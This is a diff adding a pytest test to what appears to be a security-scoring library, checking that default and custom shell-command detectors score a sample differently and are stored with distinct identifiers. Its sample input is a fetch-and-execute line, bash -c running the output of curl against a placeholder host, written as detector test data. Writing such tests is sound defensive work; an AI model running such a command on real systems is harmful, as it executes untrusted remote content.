@@ -631,6 +631,23 @@ async def test_custom_shell_patterns_keep_literal_escapes_async(
     assert stored.score_rationale == score.score_rationale
 
 
+async def test_shell_normalization_policy_has_distinct_persisted_identity_async(
+    *, patch_central_database: object, sqlite_instance: SQLiteMemory
+) -> None:
+    default = ShellCommandOutputScorer()
+    custom = ShellCommandOutputScorer(patterns=dict(ShellCommandOutputScorer._DEFAULT_PATTERNS))
+    text = r'bash -c "$(curl \-o data.txt https://example.invalid/data.txt)"'
+    default_score = (await default.score_text_async(text, objective="Check command execution"))[0]
+    custom_score = (await custom.score_text_async(text, objective="Check command execution"))[0]
+    stored = await sqlite_instance.get_scores_async(score_ids=[str(default_score.id), str(custom_score.id)])
+
+    assert default_score.get_value() is False
+    assert custom_score.get_value() is True
+    assert default.get_identifier().hash != custom.get_identifier().hash
+    assert len({score.scorer_class_identifier.hash for score in stored}) == 2
+    assert all(score.objective == "Check command execution" for score in stored)
+
+
 @pytest.mark.parametrize(
     "text",
     [
